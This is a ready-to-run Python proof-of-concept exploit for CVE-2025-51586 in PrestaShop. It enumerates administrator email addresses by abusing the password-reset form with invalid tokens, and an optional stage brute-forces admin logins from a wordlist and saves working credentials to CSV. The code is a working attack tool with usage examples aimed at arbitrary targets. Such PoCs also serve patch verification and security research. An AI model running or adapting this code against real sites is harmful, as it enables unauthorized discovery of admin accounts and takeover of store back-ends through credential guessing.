#!/usr/bin/env python3
"""
PoC for CVE-2025-51586 - PrestaShop AdminLogin Email Enumeration (with optional brute-force)

This vulnerability allows an attacker to enumerate administrator email addresses
via the password reset mechanism. If an invalid reset_token is provided with a
valid id_employee, the system may return a hidden HTML field containing the
administrator's email address.

If the optional --brute flag is used, the script will also attempt default-password
logins against discovered emails using PrestaShop's AdminLogin AJAX endpoint.

Usage:
------
Interactive mode:
    python3 cve_2025_51586_enum.py

CLI mode:
    python3 cve_2025_51586_enum.py -u URL -s START_ID -e END_ID -t TOKEN [options]

Example (enum only):
    python3 cve_2025_51586_enum.py -u "https://target/admin/index.php?controller=AdminLogin&reset=1" \
        -s 1 -e 50 -m POST -t invalidtoken123 --delay 0.5 --timeout 10 --export result.csv

Example (enum + brute-force):
    python3 cve_2025_51586_enum.py -u "https://target/admin/index.php?controller=AdminLogin&reset=1" \
        -s 1 -e 50 -t invalidtoken123 --brute ./wordlist.txt --login-url "https://target/admin/index.php?controller=AdminLogin"

Author: 7h30th3r0n3 (Ethical PoC)
CVE reference: https://security.friendsofpresta.org/core/2025/09/04/CVE-2025-51586.html
Dependencies : pip install requests beautifulsoup4 rich
"""

import requests
import argparse
import sys
import time
import csv
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt
from rich.progress import track

console = Console()
requests.packages.urllib3.disable_warnings()

# ------------------- ENUMERATION -------------------

def extract_reset_email(html):
    soup = BeautifulSoup(html, "html.parser")
    hidden_input = soup.find("input", {"name": "reset_email", "type": "hidden"})
    if hidden_input and hidden_input.get("value"):
        return hidden_input["value"]
    return None

def test_id(base_url, id_employee, token, method="POST", delay=0, timeout=10):
    data = {
        "id_employee": str(id_employee),
        "reset_token": token
    }

    try:
        if method.upper() == "POST":
            resp = requests.post(base_url, data=data, verify=False, timeout=timeout)
        else:
            resp = requests.get(base_url, params=data, verify=False, timeout=timeout)

        if resp.status_code == 200:
            email = extract_reset_email(resp.text)
            return email
        else:
            console.print(f"[red]HTTP Error {resp.status_code} for ID {id_employee}[/red]")
    except requests.exceptions.ConnectTimeout:
        console.print(f"[yellow]‚è±Ô∏è Connection timeout for ID {id_employee} (> {timeout}s)[/yellow]")
    except requests.exceptions.ReadTimeout:
        console.print(f"[yellow]üì≠ Read timeout for ID {id_employee} (> {timeout}s)[/yellow]")
    except requests.exceptions.RequestException as e:
        console.print(f"[red]‚ùå Network exception for ID {id_employee}: {e}[/red]")

    time.sleep(delay)
    return None

def run_enum(base_url, start, end, method, token, delay, export, timeout):
    found = []
    console.print(f"[bold cyan]Starting enumeration from ID {start} to {end}...[/bold cyan]")

    for i in track(range(start, end + 1), description="Scanning..."):
        email = test_id(base_url, i, token, method, delay, timeout)
        if email:
            console.print(f"[green]‚úî id_employee={i} ‚Üí {email}[/green]")
            found.append((i, email))

    if found:
        table = Table(title="Discovered Emails")
        table.add_column("ID", justify="right")
        table.add_column("Email", style="green")

        for id_emp, mail in found:
            table.add_row(str(id_emp), mail)

        console.print(table)

        if export:
            with open(export, "w", newline="", encoding="utf-8") as f:
                writer = csv.writer(f)
                writer.writerow(["id_employee", "email"])
                writer.writerows(found)
            console.print(f"[bold green]Results exported to {export}[/bold green]")

    else:
        console.print("[yellow]No emails discovered.[/yellow]")

    return found

# ------------------- BRUTE-FORCE -------------------

def attempt_presta_login(login_url, email, password, timeout=10):
    """
    PrestaShop login using AJAX call. Language-independent by checking only hasErrors flag.
    """
    data = {
        "ajax": "1",
        "token": "",
        "controller": "AdminLogin",
        "submitLogin": "1",
        "email": email,
        "passwd": password,
        "redirect": ""
    }

    headers = {
        "User-Agent": "Mozilla/5.0 (PoC CVE-2025-51586)",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    try:
        response = requests.post(login_url, data=data, headers=headers, timeout=timeout, verify=False)
        if response.status_code != 200:
            return False, f"HTTP {response.status_code}"
        try:
            json_data = response.json()
        except ValueError:
            return False, "Invalid JSON"

        if json_data.get("hasErrors") is False:
            return True, "Login successful"
        else:
            return False, "Login failed"
    except Exception as e:
        return False, f"Network error: {e}"

def run_brute_force(found_emails, wordlist_path, login_url, delay, timeout, export):
    """
    Brute-force PrestaShop logins using discovered emails and a wordlist.
    Clean output: only one progress line per email, only show success or final failure.
    """
    successes = []

    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        console.print(f"[red]Failed to read wordlist: {e}[/red]")
        return successes

    if not passwords:
        console.print(f"[yellow]Wordlist is empty. Skipping brute-force.[/yellow]")
        return successes

    console.print(f"\n[bold cyan]Starting brute-force on {len(found_emails)} emails using {len(passwords)} passwords...[/bold cyan]")

    for id_emp, email in found_emails:
        found = False
        task_desc = f"Brute-forcing: {email}"
        for password in track(passwords, description=task_desc, update_period=0.1):
            success, reason = attempt_presta_login(login_url, email, password, timeout=timeout)
            time.sleep(delay)

            if success:
                console.print(f"[green]‚úî SUCCESS: {email}:{password}[/green]")
                successes.append((id_emp, email, password))
                found = True
                break

        if not found:
            console.print(f"[yellow]‚úñ No valid password found for {email}[/yellow]")

    if export and successes:
        try:
            with open(export, "a", newline="", encoding="utf-8") as f:
                writer = csv.writer(f)
                writer.writerow(["id_employee", "email", "password"])
                for entry in successes:
                    writer.writerow(entry)
            console.print(f"[bold green]Brute results appended to {export}[/bold green]")
        except Exception as e:
            console.print(f"[red]Failed to write brute results to CSV: {e}[/red]")

    return successes

# ------------------- MAIN -------------------

def main():
    parser = argparse.ArgumentParser(
        description="PoC for CVE-2025-51586 - PrestaShop AdminLogin Email Enumeration (with optional brute-force)"
    )
    parser.add_argument("-u", "--url", help="Target reset URL", required=False)
    parser.add_argument("-s", "--start", type=int, help="Start id_employee", default=1)
    parser.add_argument("-e", "--end", type=int, help="End id_employee", default=50)
    parser.add_argument("-m", "--method", help="HTTP method (GET/POST)", default="POST")
    parser.add_argument("-t", "--token", help="Reset token to use", default="invalidtoken123")
    parser.add_argument("-d", "--delay", type=float, help="Delay between requests (seconds)", default=0.5)
    parser.add_argument("--timeout", type=int, help="Network timeout (seconds)", default=10)
    parser.add_argument("--export", help="Export discovered emails to CSV", default=None)

    # Optional brute-force
    parser.add_argument("--brute", help="Path to wordlist for default-password brute-force", default=None)
    parser.add_argument("--login-url", help="Login URL for PrestaShop login attempts (if omitted, inferred from reset URL)", default=None)
    parser.add_argument("--brute-delay", type=float, help="Delay between brute attempts (seconds)", default=0.2)

    args = parser.parse_args()

    if not args.url:
        console.print("[bold yellow]Interactive mode:[/bold yellow]")
        base_url = Prompt.ask("üîó Reset URL")
        start = int(Prompt.ask("üî¢ Start id_employee", default="1"))
        end = int(Prompt.ask("üî¢ End id_employee", default="50"))
        method = Prompt.ask("üì° Method (GET/POST)", choices=["GET", "POST"], default="POST")
        token = Prompt.ask("üîë Reset token", default="invalidtoken123")
        delay = float(Prompt.ask("‚è±Ô∏è Delay between requests (s)", default="0.5"))
        timeout = int(Prompt.ask("üõë Network timeout (s)", default="10"))
        export = Prompt.ask("üíæ Export CSV filename (optional)", default="").strip() or None
        brute = Prompt.ask("üß® Path to wordlist for brute-force (optional)", default="").strip() or None
        login_url = Prompt.ask("üîê Login URL (leave empty to infer from reset URL)", default="").strip() or None
        brute_delay = float(Prompt.ask("‚åõ Brute-force delay between attempts (s)", default="0.2"))
    else:
        base_url = args.url
        start = args.start
        end = args.end
        method = args.method
        token = args.token
        delay = args.delay
        timeout = args.timeout
        export = args.export
        brute = args.brute
        login_url = args.login_url
        brute_delay = args.brute_delay

    found_emails = run_enum(base_url, start, end, method, token, delay, export, timeout)

    if brute and found_emails:
        login_endpoint = login_url or base_url.split("?", 1)[0]
        run_brute_force(found_emails, brute, login_endpoint, brute_delay, timeout, export)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[red]Interrupted by user[/red]")
        sys.exit(0)
